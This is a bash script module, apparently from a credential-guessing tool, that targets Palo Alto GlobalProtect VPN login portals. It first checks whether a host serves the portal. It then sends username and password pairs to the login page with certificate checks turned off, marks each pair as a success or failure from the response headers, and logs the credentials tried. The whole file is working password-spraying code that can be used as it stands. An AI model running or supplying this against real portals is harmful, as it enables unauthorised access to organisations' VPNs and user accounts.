#!/bin/bash

check_PaloAlto(){
	check_Portal=$(wget --timeout=4 -qO- https://$1/global-protect/login.esp --no-check-certificate);
	if [[ "$(echo $check_Portal | grep "GlobalProtect Portal")" ]] || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] ; then
		:
	else	
		echo "Either not a Palo Alto GlobalProtect portal, or not compatible version.";
		echo "Exiting...";
		exit 1;
	fi
}

POST_PaloAlto(){
LOG_YES=false;
LOG=/tmp/conformer.log;
#Determine if Logging, and where to log
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "log="* ]]; then
LOG_YES=true;
LOG=$(echo "$5" | grep -i log | cut -d "=" -f 2);
	if [[ "$LOG" == "" ]] ; then
		LOG=$(echo "$6" | grep -i log | cut -d "=" -f 2);
		if [[ "$LOG" == "" ]] ; then
			LOG=$(echo "$7" | grep -i log | cut -d "=" -f 2);
			if [[ "$LOG" == "" ]] ; then
				LOG=$(echo "$8" | grep -i log | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$LOG" ]] ; then
	LOG_YES=false;
fi
fi


DEBUG_YES=false;
DEBUG=/tmp/conformer.debug;
#Determine if Debuging, and where to debug to.
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "debug="* ]]; then
DEBUG_YES=true;
DEBUG=$(echo "$5" | grep -i debug | cut -d "=" -f 2);
	if [[ "$DEBUG" == "" ]] ; then
		DEBUG=$(echo "$6" | grep -i debug | cut -d "=" -f 2);
		if [[ "$DEBUG" == "" ]] ; then
			DEBUG=$(echo "$7" | grep -i debug | cut -d "=" -f 2);
			if [[ "$DEBUG" == "" ]] ; then
				DEBUG=$(echo "$8" | grep -i debug | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$DEBUG" ]] ; then
	DEBUG_YES=false;
fi
fi


			#Curl sends POST parameters to SSLVPL Portal
			POST=$(curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/global-protect/login.esp' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=9e7196647c59703b404598304f36e9ff' \
    --data-binary $'prot=https%3A&server='$1'&inputStr=&action=getsoftware&user='$line'&passwd='$pass'&ok=Login' \
    $'https://'$1'/global-protect/login.esp');
		#If Logging is enabled loop userlist
		if [[ $DEBUG_YES == true ]]; then
			echo "host:$1 username:$line password:$pass" >> "$DEBUG";
			echo "" >> "$DEBUG";			
			echo "$POST" >> "$DEBUG";
			echo "" >> "$DEBUG";	
			echo "" >> "$DEBUG";	
			echo "-------------------------------------------------------------" >> "$DEBUG";	
		fi
			#checks if cookies returned or left empty or if default return html presented.
				#checks cookie to see if successful login
		if [[ $POST == *"Location: /global-protect/getsoftwarepage.esp"* ]]; then
			echo "	$line:$pass:**Success**";
		# Logging
		if [[ $LOG_YES == true ]]; then
			echo "	$line:$pass:**Success**" >> "$LOG";
		fi
		elif [[ $POST == *"x-private-pan-globalprotect: auth-failed"* ]]; then
			echo "	$line:$pass:Fail";
		# Logging
		if [[ $LOG_YES == true ]]; then
			echo "	$line:$pass:Fail" >> "$LOG";
		fi
		else
			echo "	$line:$pass:Fail --- Page not responding properly.";
		if [[ $LOG_YES == true ]]; then
			echo "	$line:$pass:Fail --- Page not responding properly." >> "$LOG";
		fi
		fi
}
